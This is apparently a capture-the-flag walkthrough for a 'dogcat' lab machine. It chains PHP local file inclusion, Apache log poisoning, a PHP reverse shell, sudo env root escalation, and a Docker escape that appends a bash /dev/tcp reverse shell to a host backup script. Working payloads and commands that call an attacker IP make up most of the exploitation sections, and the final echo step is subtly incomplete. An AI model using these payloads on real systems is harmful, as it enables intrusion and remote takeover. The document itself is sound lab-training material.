- **Target IP: *10.10.32.141*
- **Difficulty: Medium**
---

## 1. Reconnaissance

### `nmap` Scan

```bash
nmap -sC -sV <IP_ADDRESS>
```

#### Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## 2. Web Enumeration

- The web page is pretty simple: An image hosting site that shows you a random dog or cat picture depending on what button you select

- `http://10.10.176.79/?view=cat` In the URL we see the section `/?view=cat`

- We can change this to dog as well, but no results for something like `/?view=index` 

- Since this web app uses PHP, we can use the function `/?view=php://filter/convert.base64-encode/resource=dog` which will give us a base64 string to decode:

```bash
echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d 
```

- **Result:**

```bash
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

- From here we can use `/?view=php://filter/convert.base64-encode/resource=dog/../index` to get the base64 string for that page:

```bash
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
```

- The result provide us with the source code for the page:

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

- Essentially, as long as the `dog` or `cat` string is included, we can control the extension to read anything we want to.

```bash
http://<IP_ADDRESS>//?view=dog/../../../../../../etc/passwd&ext=
```

- This provides us with the `/etc/passwd` file:

```php
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

- We now have an attack vector known as **Local File Inclusion** or **LFI**

- Lets view some Apache log files with:

```bash
http://<IP_ADDRESS>//?view=dog/../../../../../../var/log/apache2/access.log&ext=
```

- We can see the `access.log` file by using `LFI`

- We exploit the fact that web servers often log request headers like `User-Agent` into access logs. If PHP is used to render these logs (via LFI), any injected PHP code will execute — this is known as log poisoning

## 3. Exploitation

- Hop over to `burpsuite` and go to the `proxy` tab

- Make sure `firefox` proxy is setup (or use `foxyproxy`)

- Reload the `http://<IP_ADDRESS>//?view=dog/../../../../../../var/log/apache2/access.log&ext=` URL and we should be able to see the `Request` in burp

- Send the request to `repeater` 

- Now, we can edit our `request`

- Use a `php reverse shell`:

```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- Add it to the end of our url in the request tab and make sure to use URL encoding on the command: 

```bash
GET //?view=dog/../../../../../../var/log/apache2/access.log&ext=&cmd=php+-r+'$sock%3dfsockopen("10.6.55.167",443)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
```

- Setup a `nc` listener on port 443

```bash
nc -nlvp 443
```

- And finally, send the request from burp and we should get a reverse shell

- In the current user dir, we can `cat` the flag `flag.php`

- We are in user `www-data`

- If we `cd ..` to the parent dir, we can get our second flag `flag2_QMW7JvaY2LvK.txt`

## 4. Privilege Escalation

- Next, we can check `sudo -l`:

```bash
 (root) NOPASSWD: /usr/bin/env
```

### Gtfobins

```bash
sudo env /bin/sh
```

- We can use this to escalate to `root`

```bash
whoami
root
```

- `cd` to the `/root` dir and we can see our `flag3.txt`

- This leaves one last flag remaining

## 5. Break out of Docker

- From the CTF description we get a clue: Exploit a PHP application via LFI **and break out of a docker container**.

- This means to get our last flag, we need to break out of the `docker` container we are in

- `cat /proc/1/cgroup` returns:

```bash
12:blkio:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
11:cpuset:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
10:pids:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
9:rdma:/
8:devices:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
7:hugetlb:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
6:perf_event:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
5:freezer:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
4:cpu,cpuacct:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
3:memory:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
2:net_cls,net_prio:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
1:name=systemd:/docker/20a9277aecec76c00b40060b0c0385b92316290009f0f186284baff20ca793cd
0::/system.slice/containerd.service
```

- This confirms we are inside of a `docker` container

- Navigate to `/opt/backups`

```bash
total 2892
drwxr-xr-x 2 root root    4096 Apr  8  2020 .
drwxr-xr-x 1 root root    4096 Jul 19 23:51 ..
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Jul 20 00:46 backup.tar
```

- We can see that the `backup.tar` file was edited quite recently

- `cat` the `backup.sh` file to see what it does

```bash
tar cf /root/container/backup/backup.tar /root/container
```

- This is creating a `tar` archive and storing it in:

```bash
root/container/backup/backup.tar
```

- Since it appears this appears to run on the actual target system (not within the docker container), we should be able to edit the `backup.sh` file and execute remote commands

- Using the earlier bash reverse shell `bash -i >& /dev/tcp/10.6.55.167/53 0>&1` (Make sure to change the port to 53, and update the IP) We can add it to the `backup.sh` file

- Don't forget to setup `nc -nlvp 53` on host machine and then:

```bash
echo "bash -i >& /dev/tcp/10.6.55.167/53 0>&1"
```

- And we now have successfully broken out of the docker container

```bash
root@dogcat:~#
```

- Lastly we can `cat` our final flag `flag4.txt`

---

[[CTF Notes]]
